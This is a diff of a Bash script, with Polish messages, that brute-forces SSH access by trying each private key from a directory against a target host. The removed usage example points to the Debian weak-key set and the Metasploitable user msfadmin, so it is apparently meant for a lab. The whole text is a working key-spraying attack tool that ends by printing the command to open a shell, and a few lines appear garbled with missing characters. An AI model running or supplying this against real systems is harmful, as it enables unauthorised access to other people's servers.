@@ -3,7 +3,6 @@ set -euo pipefail
 
 if [[ $# -ne 3 ]]; then
 echo "Użycie: $0 <target_ip_or_host> <user> <keys_dir>"
-echo "Przykład: $0 192.168.100.20 msfadmin /path/debian-ssh/debian_ssh_rsa_2048"
 exit 1
 fi
 
@@ -15,22 +14,25 @@ if [[ ! -d "$KEYDIR" ]]; then
 echo "Błąd: katalog z kluczami nie istnieje: $KEYDIR"
 exit 2
 fi
-
 command -v ssh >/dev/null || { echo "Brak ssh w PATH"; exit 3; }
 
-echo "[] Target: $USER@$TARGET"
-echo "[] Katalog kluczy: $KEYDIR"
+mapfile -t KEYS < <(find "$KEYDIR" -maxdepth 1 -type f ! -name "*.pub" -print0 | xargs -0 -I{} echo "{}")
+TOTAL="${#KEYS[@]}"
+if (( TOTAL == 0 )); then
+echo "Brak plików kluczy w $KEYDIR"
+exit 4
+fi
 
+echo "[] Target: $USER@$TARGET"
+echo "[] Klucze do sprawdzenia: $TOTAL"
 SSH_OPTS=(-o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5)
 
 HIT=""
-COUNT=0
-shopt -s nullglob
-for key in "$KEYDIR"/; do
-[[ -f "$key" ]] || continue
-((COUNT++)) || true
+INDEX=0
+for key in "${KEYS[@]}"; do
+((INDEX++))
 chmod 600 "$key" 2>/dev/null || true
-printf "\r[] Sprawdzam klucz %d: %s" "$COUNT" "$(basename "$key")"
+printf "\r[*] [%d/%d] %s" "$INDEX" "$TOTAL" "$(basename "$key")"
 if ssh -i "$key" "${SSH_OPTS[@]}" "$USER@$TARGET" true &>/dev/null; then
 HIT="$key"
 echo
@@ -41,9 +43,9 @@ done
 echo
 
 if [[ -z "$HIT" ]]; then
-echo "[-] Brak trafienia w puli: $KEYDIR"
-exit 4
+echo "[-] Brak trafienia po sprawdzeniu $TOTAL kluczy."
+exit 5
 fi
 
-echo "[] Aby uruchomić powłokę:"
+echo "[] Uruchom powłokę:"
 echo "ssh -i "$HIT" ${SSH_OPTS[]} $USER@$TARGET"
